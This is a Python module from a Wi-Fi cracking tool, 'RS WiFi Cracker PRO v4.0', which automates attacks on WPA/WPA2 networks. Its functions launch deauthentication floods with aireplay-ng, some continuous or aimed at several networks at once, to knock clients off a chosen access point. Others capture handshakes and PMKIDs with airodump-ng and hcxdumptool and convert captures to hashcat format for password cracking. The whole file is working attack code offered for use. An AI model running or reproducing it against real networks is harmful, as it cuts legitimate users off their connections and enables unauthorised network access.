#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""RS WiFi Cracker PRO v4.0 - Handshake Capturer Module"""

import os
import re
import sys
import time
import json
import subprocess
import threading
import queue
from datetime import datetime
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Callable
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))
from core.types import WiFiNetwork, CaptureResult
from utils.logger import Logger
from utils.config import config

logger = Logger('Capturer')


class HandshakeCapturer:
    """Advanced WPA/WPA2/PMKID Handshake Capture Engine"""
    
    def __init__(self, interface: str):
        self.interface = interface
        self.capture_process = None
        self.deauth_process = None
        self.capturing = False
        self.output_dir = Path(config.get('general.temp_dir', '/tmp/t3rmuxk1ng_wifi')) / 'captures'
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.callbacks: List[Callable] = []
        self.results: List[CaptureResult] = []
        self.stats = {
            'total_captures': 0,
            'successful_captures': 0,
            'handshakes': 0,
            'pmkids': 0,
            'total_packets': 0
        }
    
    def capture(self, target: WiFiNetwork, duration: int = 120, 
                deauth: bool = True, deauth_count: int = 10) -> CaptureResult:
        """Capture WPA/WPA2 handshake"""
        start_time = time.time()
        
        # Set channel
        self._set_channel(target.channel)
        
        output_base = str(self.output_dir / f"capture_{target.bssid.replace(':', '')}_{int(time.time())}")
        
        # Start airodump-ng
        cmd = ['sudo', 'airodump-ng', self.interface,
               '-c', str(target.channel),
               '--bssid', target.bssid,
               '-w', output_base]
        
        try:
            self.capture_process = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True
            )
            self.capturing = True
            
            # Send deauth
            if deauth:
                time.sleep(2)
                self._send_deauth(target.bssid, deauth_count)
            
            # Monitor for handshake
            cap_file = f"{output_base}-01.cap"
            handshake_found = False
            packets_captured = 0
            
            for elapsed in range(duration):
                if not self.capturing:
                    break
                
                # Check stderr for handshake message
                if self.capture_process.poll() is None:
                    line = self.capture_process.stderr.readline()
                    if 'WPA handshake' in line:
                        handshake_found = True
                        break
                
                # Verify cap file
                if os.path.exists(cap_file):
                    if self._verify_handshake(cap_file, target.bssid):
                        handshake_found = True
                        packets_captured = os.path.getsize(cap_file)
                        break
                
                time.sleep(1)
            
            self._stop()
            
            time_taken = time.time() - start_time
            self.stats['total_captures'] += 1
            
            if handshake_found:
                self.stats['successful_captures'] += 1
                self.stats['handshakes'] += 1
                self.stats['total_packets'] += packets_captured
                
                result = CaptureResult(
                    success=True,
                    bssid=target.bssid,
                    essid=target.essid,
                    cap_file=cap_file,
                    handshake_type='WPA/WPA2',
                    packets_captured=packets_captured,
                    time_taken=time_taken
                )
            else:
                result = CaptureResult(
                    success=False,
                    bssid=target.bssid,
                    essid=target.essid,
                    error="No handshake captured"
                )
            
            self.results.append(result)
            return result
            
        except Exception as e:
            self._stop()
            return CaptureResult(success=False, bssid=target.bssid, error=str(e))
    
    def capture_aggressive(self, target: WiFiNetwork, duration: int = 120) -> CaptureResult:
        """Aggressive capture with continuous deauth"""
        start_time = time.time()
        
        self._set_channel(target.channel)
        output_base = str(self.output_dir / f"aggressive_{target.bssid.replace(':', '')}_{int(time.time())}")
        
        # Start capture
        cmd = ['sudo', 'airodump-ng', self.interface,
               '-c', str(target.channel),
               '--bssid', target.bssid,
               '-w', output_base]
        
        try:
            self.capture_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            self.capturing = True
            
            # Continuous deauth
            deauth_cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', target.bssid, self.interface]
            self.deauth_process = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            cap_file = f"{output_base}-01.cap"
            
            for elapsed in range(duration):
                if not self.capturing:
                    break
                
                if os.path.exists(cap_file) and self._verify_handshake(cap_file, target.bssid):
                    break
                
                time.sleep(1)
            
            self._stop()
            
            if os.path.exists(cap_file) and self._verify_handshake(cap_file, target.bssid):
                return CaptureResult(
                    success=True, bssid=target.bssid, essid=target.essid,
                    cap_file=cap_file, time_taken=time.time() - start_time
                )
            
            return CaptureResult(success=False, bssid=target.bssid, error="No handshake")
            
        except Exception as e:
            self._stop()
            return CaptureResult(success=False, bssid=target.bssid, error=str(e))
    
    def capture_pmkid(self, target: WiFiNetwork, timeout: int = 60) -> CaptureResult:
        """Capture PMKID using hcxdumptool"""
        output_file = str(self.output_dir / f"pmkid_{target.bssid.replace(':', '')}_{int(time.time())}.pcapng")
        
        try:
            # Create filter file
            filter_file = str(self.output_dir / 'filter.txt')
            with open(filter_file, 'w') as f:
                f.write(target.bssid.replace(':', ''))
            
            cmd = ['sudo', 'hcxdumptool', '-i', self.interface,
                   '-o', output_file, '--enable_status=1',
                   '--filterlist_ap', filter_file, '--filtermode=2']
            
            self.capture_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            
            pmkid_found = False
            start_time = time.time()
            
            while time.time() - start_time < timeout:
                line = self.capture_process.stdout.readline()
                if 'PMKID' in line or 'EAPOL' in line:
                    pmkid_found = True
                    break
            
            self.capture_process.terminate()
            os.remove(filter_file)
            
            if pmkid_found and os.path.exists(output_file):
                self.stats['pmkids'] += 1
                return CaptureResult(
                    success=True, bssid=target.bssid, essid=target.essid,
                    cap_file=output_file, handshake_type='PMKID'
                )
            
            return CaptureResult(success=False, bssid=target.bssid, error="PMKID not captured")
            
        except FileNotFoundError:
            return CaptureResult(success=False, bssid=target.bssid, error="hcxdumptool not found")
        except Exception as e:
            return CaptureResult(success=False, bssid=target.bssid, error=str(e))
    
    def capture_multi(self, targets: List[WiFiNetwork], duration: int = 180) -> Dict[str, CaptureResult]:
        """Capture from multiple targets"""
        results = {}
        
        channels = list(set(t.channel for t in targets))
        channel_str = ','.join(map(str, channels))
        
        output_base = str(self.output_dir / f"multi_{int(time.time())}")
        
        cmd = ['sudo', 'airodump-ng', self.interface, '-c', channel_str, '-w', output_base]
        
        try:
            self.capture_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            self.capturing = True
            
            # Deauth all targets
            def deauth_loop():
                while self.capturing:
                    for t in targets:
                        self._send_deauth(t.bssid, 5)
                    time.sleep(30)
            
            deauth_thread = threading.Thread(target=deauth_loop, daemon=True)
            deauth_thread.start()
            
            time.sleep(duration)
            self._stop()
            
            cap_file = f"{output_base}-01.cap"
            if os.path.exists(cap_file):
                for target in targets:
                    has_hs = self._verify_handshake(cap_file, target.bssid)
                    results[target.bssid] = CaptureResult(
                        success=has_hs, bssid=target.bssid,
                        cap_file=cap_file if has_hs else ""
                    )
        
        except Exception as e:
            self._stop()
        
        return results
    
    def _send_deauth(self, bssid: str, count: int = 10, client: str = "FF:FF:FF:FF:FF:FF") -> bool:
        """Send deauth packets"""
        try:
            cmd = ['sudo', 'aireplay-ng', '--deauth', str(count),
                   '-a', bssid, '-c', client, self.interface]
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(3)
            process.terminate()
            return True
        except:
            return False
    
    def _set_channel(self, channel: int) -> bool:
        """Set interface channel"""
        try:
            subprocess.run(['sudo', 'iwconfig', self.interface, 'channel', str(channel)],
                         capture_output=True, timeout=5)
            return True
        except:
            return False
    
    def _verify_handshake(self, cap_file: str, bssid: str) -> bool:
        """Verify handshake in capture file"""
        try:
            result = subprocess.run(['aircrack-ng', cap_file],
                                   capture_output=True, text=True, timeout=10)
            return 'WPA' in result.stdout and 'handshake' in result.stdout.lower()
        except:
            return False
    
    def convert_to_hashcat(self, cap_file: str) -> Optional[str]:
        """Convert to hashcat format"""
        hccapx = cap_file.replace('.cap', '.hccapx')
        try:
            subprocess.run(['aircrack-ng', '-J', hccapx.replace('.hccapx', ''), cap_file],
                          capture_output=True)
            return hccapx if os.path.exists(hccapx) else None
        except:
            return None
    
    def _stop(self):
        """Stop all processes"""
        self.capturing = False
        if self.capture_process:
            self.capture_process.terminate()
        if self.deauth_process:
            self.deauth_process.terminate()
    
    def stop(self): self._stop()
    def get_stats(self) -> Dict: return self.stats.copy()
    def get_results(self) -> List[CaptureResult]: return self.results.copy()
